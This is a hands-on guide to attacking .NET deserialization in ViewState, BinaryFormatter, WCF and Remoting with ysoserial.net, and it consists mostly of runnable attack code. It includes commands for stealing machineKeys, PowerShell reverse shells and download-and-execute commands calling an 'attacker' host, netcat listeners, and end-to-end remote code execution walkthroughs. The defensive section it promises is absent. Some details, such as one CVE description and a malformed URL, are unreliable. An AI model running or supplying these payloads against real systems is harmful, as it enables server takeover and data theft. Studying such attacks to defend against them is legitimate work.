# .NET Deserialization Guide

> Comprehensive guide covering .NET deserialization exploitation including BinaryFormatter, SoapFormatter, LosFormatter, ViewState, and WCF deserialization attacks using ysoserial.net with full gadget chain analysis and real-world exploitation walkthroughs.

## Introduction and Objectives

.NET deserialization vulnerabilities are among the most impactful attack vectors against Windows-based web applications and services. The .NET Framework provides multiple serialization mechanisms -- BinaryFormatter, SoapFormatter, LosFormatter, NetDataContractSerializer, and ViewState -- all of which have been found vulnerable to gadget chain exploitation. The ysoserial.net tool provides pre-built gadget chains for reliable exploitation across these formats.

This guide covers:

- Understanding .NET serialization formats and attack surfaces
- ViewState exploitation with and without machineKey disclosure
- BinaryFormatter direct exploitation via ysoserial.net gadgets
- LosFormatter, SoapFormatter, and WCF deserialization attacks
- machineKey extraction and exploitation methodology
- Full exploitation walkthroughs for common .NET scenarios
- Defensive strategies and detection techniques

### Prerequisites

- ysoserial.net downloaded from the official repository
- .NET Framework 4.x SDK or runtime for payload generation
- Burp Suite or similar proxy for traffic manipulation
- Understanding of ASP.NET ViewState and machineKey architecture
- Callback infrastructure for blind detection testing

## 1. .NET Serialization Format Fundamentals

### Understanding .NET Serialization Formats

The .NET Framework provides multiple serialization formatters, each with different characteristics and exploitation paths. Understanding these formats is essential for identifying attack surfaces and selecting the correct exploitation technique.

```bash
# .NET serialization format identification:
# BinaryFormatter: Binary data, Base64 often starts with "AAQAA"
#   Raw bytes start with: 0x00 0x01 0x00 0x00 0x00
#   Contains .NET type metadata and object graphs
#   Used in: remoting, WCF, BinaryFormatter.Serialize()

# LosFormatter: Used for ASP.NET ViewState encoding
#   Output is Base64 encoded, may be MAC-signed
#   Used in: __VIEWSTATE hidden field, __EVENTVALIDATION

# ObjectStateFormatter: Similar to LosFormatter with different encoding
#   Used in: ASP.NET hidden fields

# SoapFormatter: XML-based .NET serialization
#   Contains SOAP envelope with .NET type information
#   Used in: legacy web services, remoting

# NetDataContractSerializer: WCF-specific format
#   Includes CLR type information in XML
#   Used in: WCF services with NetTcpBinding

# Identify ViewState format in ASP.NET application
curl -s http://target/default.aspx | grep -oP '__VIEWSTATE[^>]*value="[^"]*"'

# Decode and inspect ViewState
echo "VIEWSTATE_VALUE" | base64 -d | xxd | head -10

# Check for .NET version
curl -sI http://target/ | grep -i "x-aspnet"
# X-AspNet-Version: 4.0.30319

# Identify ViewState MAC status
# If ViewState is unsigned, the first byte after Base64 decode is typically 0xFF
# If signed, it starts with validation hash bytes
```

### .NET Serialization Magic Bytes

```bash
# BinaryFormatter magic bytes
python3 -c "
import base64
# BinaryFormatter output typically starts with these bytes
magic = bytes([0x00, 0x01, 0x00, 0x00, 0x00])
print('BinaryFormatter magic (hex):', magic.hex())
print('BinaryFormatter magic (base64):', base64.b64encode(magic).decode())
"

# ViewState unencoded format
# Byte 0: 0xFF (unencrypted, unsigned)
# Byte 0-19: HMAC-SHA1 hash (if MAC enabled, 20 bytes)
# Byte 0-31: AES encrypted block (if encrypted)

# Quick ViewState analysis
python3 -c "
import base64, sys
try:
    data = base64.b64decode('VIEWSTATE_VALUE_HERE')
    print(f'Length: {len(data)} bytes')
    print(f'First 10 bytes: {data[:10].hex()}')
    if data[0] == 0xff:
        print('ViewState appears unsigned (no MAC)')
    else:
        print('ViewState appears signed (MAC present)')
except Exception as e:
    print(f'Error: {e}')
"
```

## 2. ViewState Exploitation

### ViewState Architecture

ASP.NET ViewState serializes page state into a hidden `__VIEWSTATE` field using LosFormatter. The ViewState can be signed with a machineKey to prevent tampering. When the MAC is disabled, weak, or the machineKey is disclosed, ViewState becomes a direct deserialization attack vector.

```bash
# Identify ViewState in ASP.NET page
curl -s http://target/default.aspx | grep -o '__VIEWSTATE.*value="[^"]*"'

# Extract ViewState value for analysis
VIEWSTATE=$(curl -s http://target/default.aspx | grep -oP '__VIEWSTATE.*?value="\K[^"]+')
echo "ViewState length: $(echo -n $VIEWSTATE | wc -c)"

# Check for ViewState without MAC (legacy ASP.NET)
# If ViewState is short and unsigned, it is likely exploitable
python3 -c "
import base64, sys
data = base64.b64decode('$VIEWSTATE')
if data[0] == 0xff:
    print('ViewState is UNSIGNED - directly exploitable!')
else:
    print('ViewState is signed - need machineKey to exploit')
"

# Check ASP.NET configuration indicators
curl -sI http://target/ | grep -i "x-aspnet-version"
curl -s http/target/web.config 2>/dev/null | grep -i "enableViewStateMac\|machineKey"
```

### ViewState Without MAC

```bash
# Generate ViewState payload for unsigned/legacy ViewState
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami" --base64

# The output is a Base64-encoded ViewState that will deserialize
# into an ObjectDataProvider gadget executing the specified command

# Inject into __VIEWSTATE field
VIEWSTATE_PAYLOAD=$(ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami" --base64 2>/dev/null)

curl -X POST http://target/default.aspx \
  -d "__VIEWSTATE=${VIEWSTATE_PAYLOAD}&__EVENTVALIDATION=&Button1=Submit"

# Alternative gadget chains for unsigned ViewState
ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
  -c "cmd /c echo pwned > C:\pwned.txt" --base64

ysoserial.net -g ActivitySurrogateSelector -f LosFormatter \
  -c "cmd /c calc.exe" --base64 --islegacy

# Legacy mode flag for older ASP.NET versions
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami" --base64 --islegacy --isdebug
```

### ViewState With Known machineKey

When the machineKey is disclosed through web.config exposure, source code leaks, or error messages, ViewState can be forged even when MAC validation is enabled.

```bash
# ViewState payload with known machineKey
# machineKey format: validationKey,decryptionKey (hex strings)
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami" --base64 \
  --machinekey "VALIDATION_KEY_HEX,DECRYPTION_KEY_HEX" \
  --path="/default.aspx" \
  --target=ViewState

# With specific validation and decryption algorithms
# Common: validation=SHA1, decryption=AES (ASP.NET 4.5 default)
ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
  -c "cmd /c whoami" --base64 \
  --machinekey "VKEY,DKEY" \
  --validation SHA1 \
  --decryption AES

# MD5 validation (weak, easily exploitable)
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami" --base64 \
  --machinekey "VKEY,DKEY" \
  --validation MD5 \
  --decryption DES

# Target specific ASP.NET page path
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami" --base64 \
  --machinekey "VKEY,DKEY" \
  --path="/admin/dashboard.aspx" \
  --target=ViewState

# Target specific .NET Framework version
ysoserial.net -g ActivitySurrogateSelector -f LosFormatter \
  -c "cmd /c calc.exe" --base64 \
  --machinekey "VKEY,DKEY" \
  --target=ViewState
```

### machineKey Extraction Methodology

```bash
# Method 1: Direct web.config access
curl -s http://target/web.config
curl -s http://target/Web.config
curl -s http://target/%77eb.config  # URL encoding bypass
curl -s http://target/..%5Cweb.config  # Path traversal

# Method 2: Error message disclosure
# Trigger errors that reveal configuration
curl -s http://target/default.aspx?aspxerrorpath=/test 2>&1 | grep -i "machinekey\|validationkey"

# Method 3: Source code repository exposure
curl -s http://target/.git/HEAD
curl -s http://target/.svn/entries
# Look for web.config in repository

# Method 4: Shared hosting with predictable keys
# Some hosting providers use default or shared machineKeys

# Parse extracted machineKey
# web.config format:
# <machineKey validationKey="HEX_STRING" decryptionKey="HEX_STRING" validation="SHA1" decryption="AES" />
grep -oP 'validationKey="\K[^"]+' web.config
grep -oP 'decryptionKey="\K[^"]+' web.config
grep -oP 'validation="\K[^"]+' web.config
grep -oP 'decryption="\K[^"]+' web.config

# Combine into ysoserial.net format: validationKey,decryptionKey
# Example: ysoserial.net ... --machinekey "VKEY,DKEY" --validation SHA1 --decryption AES
```

## 3. BinaryFormatter Exploitation

### Direct BinaryFormatter Attacks

BinaryFormatter is the most dangerous .NET serialization formatter because it preserves full type information and supports arbitrary object graph deserialization. Microsoft has officially deprecated BinaryFormatter due to its insecurity.

```bash
# ObjectDataProvider gadget (most versatile)
ysoserial.net -g ObjectDataProvider -f BinaryFormatter \
  -c "cmd /c whoami" --base64

# TypeConfuseDelegate gadget (compact, reliable)
# Uses MulticastDelegate confusion to execute arbitrary commands
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter \
  -c "cmd /c whoami" --base64

# ActivitySurrogateSelector gadget (assembly loading)
# Can load custom .NET assemblies for advanced exploitation
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter \
  -c "cmd /c calc.exe" --base64

# TextFormattingRunProperties (Visual Studio / Azure DevOps)
# Targets WPF text formatting classes
ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter \
  -c "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')" \
  --base64

# WindowsIdentity (requires System.IdentityModel)
# Uses Windows identity impersonation chain
ysoserial.net -g WindowsIdentity -f BinaryFormatter \
  -c "cmd /c whoami" --base64

# Compare payload sizes (smaller is more reliable for delivery)
for gadget in ObjectDataProvider TypeConfuseDelegate ActivitySurrogateSelector; do
  payload=$(ysoserial.net -g $gadget -f BinaryFormatter -c "cmd /c whoami" --base64 2>/dev/null)
  echo "$gadget: $(echo -n $payload | wc -c) bytes (base64)"
done
```

### SoapFormatter and Other Formatters

```bash
# SoapFormatter (XML-based .NET serialization)
ysoserial.net -g ObjectDataProvider -f SoapFormatter \
  -c "cmd /c whoami" --base64

# NetDataContractSerializer (WCF services)
# Includes CLR type information for WCF endpoints
ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer \
  -c "cmd /c whoami" --base64

# ObjectStateFormatter (hidden field serialization)
ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter \
  -c "cmd /c whoami" --base64

# DataContractSerializer (limited exploitation surface)
# Requires known types registered on the server
ysoserial.net -g WindowsIdentity -f DataContractSerializer \
  -c "cmd /c whoami" --base64
```

### Custom Assembly Loading

```bash
# ActivitySurrogateSelectorFromFile - load custom .NET assembly
# Step 1: Create custom C# payload
cat > ShellLoader.cs << 'CSEOF'
using System;
using System.Diagnostics;

public class ShellLoader {
    public static void Main() {
        // This code executes during deserialization via static constructor
    }

    static ShellLoader() {
        Process.Start("cmd.exe", "/c whoami > C:\\pwned.txt");
    }
}
CSEOF

# Step 2: Compile to DLL
csc /target:library /out:ShellLoader.dll ShellLoader.cs

# Step 3: Generate payload with custom assembly
ysoserial.net -g ActivitySurrogateSelectorFromFile -f BinaryFormatter \
  -c "cmd /c calc" \
  --input-file ShellLoader.dll \
  --base64

# Step 4: Deliver via identified BinaryFormatter endpoint
```

## 4. WCF and Remoting Deserialization

### WCF Service Exploitation

Windows Communication Foundation (WCF) services can use NetDataContractSerializer which includes full CLR type information, making them vulnerable to deserialization attacks.

```bash
# Identify WCF service endpoints
# Look for .svc files in the application
curl -s http://target/Service.svc | grep -i "endpoint\|binding"

# WCF with NetDataContractSerializer
ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer \
  -c "cmd /c whoami" --base64

# WCF SOAP message with embedded serialized object
# Craft SOAP envelope containing the payload
PAYLOAD=$(ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer \
  -c "cmd /c whoami" --base64 2>/dev/null)

# Send to WCF endpoint
curl -X POST http://target/Service.svc \
  -H 'Content-Type: application/soap+xml' \
  -H 'SOAPAction: "http://tempuri.org/IService/Method"' \
  -d "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">
  <s:Body>
    <Method xmlns=\"http://tempuri.org/\">
      <data>${PAYLOAD}</data>
    </Method>
  </s:Body>
</s:Envelope>"
```

### .NET Remoting Exploitation

```bash
# .NET Remoting uses BinaryFormatter or SoapFormatter
# Identify remoting endpoints
curl -s http://target/Service.rem -o /dev/null -w '%{http_code}\n'
curl -s http://target/Service.soap -o /dev/null -w '%{http_code}\n'

# Generate remoting payload
ysoserial.net -g ObjectDataProvider -f BinaryFormatter \
  -c "cmd /c whoami" --base64

# Send via remoting channel
curl -X POST http://target/Service.rem \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @<(echo "BASE64_PAYLOAD" | base64 -d)

# .NET Remoting with SoapFormatter
PAYLOAD=$(ysoserial.net -g ObjectDataProvider -f SoapFormatter \
  -c "cmd /c whoami" --base64 2>/dev/null)

curl -X POST http://target/Service.soap \
  -H 'Content-Type: text/xml' \
  --data-binary @<(echo "$PAYLOAD" | base64 -d)
```

## 5. Reverse Shell Techniques

### PowerShell Reverse Shell

```bash
# Step 1: Generate PowerShell reverse shell command
ps_shell='$c=New-Object System.Net.Sockets.TcpClient("attacker",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$c.Close()'

# Step 2: Base64 encode with UTF-16LE (PowerShell requirement)
ps_b64=$(echo -n "$ps_shell" | iconv -t UTF-16LE | base64 -w0)
echo "Encoded PS shell: $ps_b64"

# Step 3: Generate ysoserial.net payload
ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
  -c "powershell -enc ${ps_b64}" --base64

# Alternative: Download cradle approach (more reliable for complex payloads)
ysoserial.net -g ObjectDataProvider -f BinaryFormatter \
  -c "cmd /c certutil -urlcache -split -f http://attacker/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe" \
  --base64

# Alternative: MSBuild inline task execution
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c msbuild http://attacker/evil.xml" --base64

# Alternative: Regsvr32 scriptlet execution
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter \
  -c "cmd /c regsvr32 /s /n /u /i:http://attacker/evil.sct scrobj.dll" --base64
```

### Staged Payload Delivery

```bash
# Stage 1: Initial callback to confirm execution
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c curl http://attacker/dotnet-initial-callback" --base64

# Stage 2: Download and execute stager
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter \
  -c "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/stager.ps1')" \
  --base64

# Stage 3: Full reverse shell from stager
# stager.ps1 content:
# $c=New-Object System.Net.Sockets.TcpClient("attacker",4444)
# $s=$c.GetStream()
# [byte[]]$b=0..65535|%{0}
# while(($i=$s.Read($b,0,$b.Length))-ne 0){
#   $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
#   $r=(iex $d 2>&1|Out-String)
#   $s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)
# }
```

## 6. Full Exploitation Walkthroughs

### Scenario 1: ASP.NET ViewState RCE via machineKey Disclosure

```bash
# Step 1: Identify ASP.NET application
curl -sI http://target/ | grep -i "x-aspnet\|server"
# X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET

# Step 2: Extract ViewState from page
VIEWSTATE=$(curl -s http://target/login.aspx | grep -oP '__VIEWSTATE.*?value="\K[^"]+')
echo "ViewState: ${VIEWSTATE:0:50}..."

# Step 3: Find machineKey through web.config exposure
curl -s http://target/web.config > web.config 2>/dev/null
if [ -s web.config ]; then
    echo "web.config found!"
    VKEY=$(grep -oP 'validationKey="\K[^"]+' web.config)
    DKEY=$(grep -oP 'decryptionKey="\K[^"]+' web.config)
    VALGO=$(grep -oP 'validation="\K[^"]+' web.config)
    DECALGO=$(grep -oP 'decryption="\K[^"]+' web.config)
    echo "Validation Key: ${VKEY:0:20}..."
    echo "Decryption Key: ${DKEY:0:20}..."
    echo "Validation Algo: $VALGO"
    echo "Decryption Algo: $DECALGO"
fi

# Step 4: Set up callback listener
python3 -m http.server 8000 &
HTTP_PID=$!

# Step 5: Generate ViewState payload with extracted machineKey
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c curl http://attacker:8000/dotnet-rce-confirmed" --base64 \
  --machinekey "${VKEY},${DKEY}" \
  --validation "${VALGO}" \
  --decryption "${DECALGO}" \
  --path="/login.aspx" \
  --target=ViewState > vs_payload.txt

# Step 6: Send forged ViewState
PAYLOAD=$(cat vs_payload.txt)
curl -X POST http://target/login.aspx \
  -d "__VIEWSTATE=${PAYLOAD}&__EVENTVALIDATION=&txtUser=admin&txtPass=admin&btnLogin=Login" \
  -o /dev/null -w 'Status: %{http_code}\n'

# Step 7: Check callback listener for confirmation
# If callback received, ViewState RCE is confirmed

# Step 8: Generate reverse shell payload
ps_shell='$c=New-Object Net.Sockets.TcpClient("attacker",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$c.Close()'
ps_b64=$(echo -n "$ps_shell" | iconv -t UTF-16LE | base64 -w0)

ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
  -c "powershell -enc ${ps_b64}" --base64 \
  --machinekey "${VKEY},${DKEY}" \
  --validation "${VALGO}" \
  --decryption "${DECALGO}" \
  --path="/login.aspx" \
  --target=ViewState > shell_payload.txt

# Step 9: Start netcat listener
nc -lvnp 4444 &

# Step 10: Send reverse shell payload
SHELL_PAYLOAD=$(cat shell_payload.txt)
curl -X POST http://target/login.aspx \
  -d "__VIEWSTATE=${SHELL_PAYLOAD}&__EVENTVALIDATION=&txtUser=admin&txtPass=admin&btnLogin=Login"

# Cleanup
kill $HTTP_PID 2>/dev/null
```

### Scenario 2: BinaryFormatter API Endpoint RCE

```bash
# Step 1: Identify .NET API accepting binary data
curl -sI http://target/api/process \
  -H 'Content-Type: application/octet-stream' \
  -w '%{http_code}\n'

# Step 2: Test for BinaryFormatter deserialization
# Send minimal binary data and observe error messages
echo "AAAA" | base64 -d | curl -X POST http://target/api/process \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @- -v 2>&1 | grep -i "binaryformatter\|deserialize\|formatter"

# Step 3: Generate callback payload
PAYLOAD=$(ysoserial.net -g ObjectDataProvider -f BinaryFormatter \
  -c "cmd /c nslookup dotnet-rce.attacker.com" --base64 2>/dev/null)

# Step 4: Send callback payload
echo "$PAYLOAD" | base64 -d | curl -X POST http://target/api/process \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @- -o /dev/null -w '%{http_code}\n'

# Step 5: Confirm callback received on DNS listener
# If callback received, BinaryFormatter RCE confirmed

# Step 6: Escalate to PowerShell reverse shell
ps_shell='$c=New-Object Net.Sockets.TcpClient("attacker",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$c.Close()'
ps_b64=$(echo -n "$ps_shell" | iconv -t UTF-16LE | base64 -w0)

FINAL=$(ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter \
  -c "powershell -enc ${ps_b64}" --base64 2>/dev/null)

# Step 7: Start listener and send payload
nc -lvnp 4444 &
echo "$FINAL" | base64 -d | curl -X POST http://target/api/process \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @-
```

## 7. Gadget Chain Deep Dive

### ObjectDataProvider Chain

The ObjectDataProvider gadget uses WPF's `System.Windows.Data.ObjectDataProvider` to instantiate arbitrary objects and invoke methods. It is the most versatile chain because it works with most formatters.

```bash
# ObjectDataProvider internally calls:
# 1. ObjectDataProvider wraps the target type
# 2. Calls Process.Start() or equivalent via method invocation
# 3. WPF PresentationFramework must be available (usually is on Windows)

# Generate with various formatters
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" --base64
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64
ysoserial.net -g ObjectDataProvider -f SoapFormatter -c "cmd /c whoami" --base64
ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer -c "cmd /c whoami" --base64
```

### TypeConfuseDelegate Chain

The TypeConfuseDelegate gadget exploits a discrepancy between how MulticastDelegate is serialized and deserialized. It is smaller and more reliable than ObjectDataProvider.

```bash
# TypeConfuseDelegate works by:
# 1. Creating a MulticastDelegate with mismatched invocation lists
# 2. During deserialization, the delegate invokes Process.Start()
# 3. Works even with CAS (Code Access Security) restrictions

ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" --base64
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami" --base64
ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami" --base64
```

### ActivitySurrogateSelector Chain

The ActivitySurrogateSelector gadget loads custom .NET assemblies via surrogate selection. It is the most advanced chain but requires specific .NET Framework versions.

```bash
# ActivitySurrogateSelector works by:
# 1. Using ActivitySurrogateSelector to load a custom assembly
# 2. The assembly executes code during type resolution
# 3. Requires .NET Framework 4.8+ or specific configurations

# Basic usage
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc.exe" --base64

# With custom assembly
ysoserial.net -g ActivitySurrogateSelectorFromFile -f BinaryFormatter \
  -c "cmd /c calc.exe" --input-file custom.dll --base64
```

### Chain Selection Guide

| Scenario | Recommended Chain | Reason |
|----------|------------------|--------|
| General BinaryFormatter | TypeConfuseDelegate | Small, reliable, no external deps |
| ViewState exploitation | ObjectDataProvider | Works with LosFormatter |
| WPF application | TextFormattingRunProperties | Targets WPF-specific classes |
| WCF service | ObjectDataProvider | Works with NetDataContractSerializer |
| Custom assembly loading | ActivitySurrogateSelectorFromFile | Loads custom DLL |
| Azure DevOps / VS | TextFormattingRunProperties | Targets VS-specific classes |
| Minimal payload size | TypeConfuseDelegate | Smallest payload size |

## Hands-on Exercises

### Exercise 1: ViewState RCE Lab

```bash
# Set up a vulnerable ASP.NET application (requires Windows/IIS or mono)
# Alternative: Use Docker with mono

# Step 1: Create vulnerable ASP.NET page
cat > default.aspx << 'ASPXEOF'
<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<body>
<form runat="server">
    <asp:Button runat="server" Text="Submit" />
</form>
</body>
</html>
ASPXEOF

# Step 2: Configure with weak ViewState settings
cat > web.config << 'XMLEOF'
<configuration>
  <system.web>
    <compilation debug="true"/>
    <!-- VULNERABLE: MAC validation disabled -->
    <pages enableViewStateMac="false"/>
    <machineKey validationKey="AutoGenerate" decryptionKey="AutoGenerate"/>
  </system.web>
</configuration>
XMLEOF

# Step 3: Generate exploit payload
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c whoami > C:\pwned.txt" --base64

# Step 4: Inject into __VIEWSTATE and submit
# curl -X POST http://localhost/default.aspx -d "__VIEWSTATE=PAYLOAD"
```

### Exercise 2: BinaryFormatter Detection and Exploitation

```bash
# Step 1: Create a test endpoint that accepts binary data
# This simulates an API endpoint using BinaryFormatter

# Step 2: Test for deserialization
# Send malformed data and check error messages
echo "invalid" | curl -X POST http://target/api/data \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @- -v 2>&1

# Step 3: Generate DNS callback payload
PAYLOAD=$(ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter \
  -c "cmd /c nslookup test.attacker.com" --base64 2>/dev/null)

# Step 4: Send and monitor for callback
echo "$PAYLOAD" | base64 -d | curl -X POST http://target/api/data \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @-

# Step 5: If callback received, escalate to reverse shell
```

## References and Resources

- **ysoserial.net GitHub**: https://github.com/pwntester/ysoserial.net -- Official ysoserial.net repository with all gadget chains
- **ysoserial.net Wiki**: https://github.com/pwntester/ysoserial.net/wiki -- Detailed documentation for each gadget chain
- **Microsoft BinaryFormatter Security Guide**: https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide -- Official security guidance
- **ViewState Security**: https://docs.microsoft.com/en-us/aspnet/web-pages/overview/security/enabling-validation -- ASP.NET ViewState validation documentation
- **NCC Group .NET Deserialization**: https://www.nccgroup.com/us/research-blog/net-deserialization/ -- In-depth .NET deserialization research
- **Soroush Dalili Research**: https://soroush.secproject.com/ -- .NET security researcher with extensive deserialization work
- **OWASP .NET Deserialization**: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html -- Cross-platform defense guidance
- **Microsoft Security Advisory**: https://msrc.microsoft.com/advisory -- Official security advisories for .NET Framework
- **CVE-2017-11317 (Telerik UI)**: Telerik UI for ASP.NET AJAX Cryptographic Weakness leading to ViewState RCE
- **CVE-2020-0688 (Exchange)**: Exchange Server ViewState deserialization via hardcoded machineKey
- **CVE-2021-27850 (Apache James)**: .NET-related deserialization in Java applications using .NET bridges
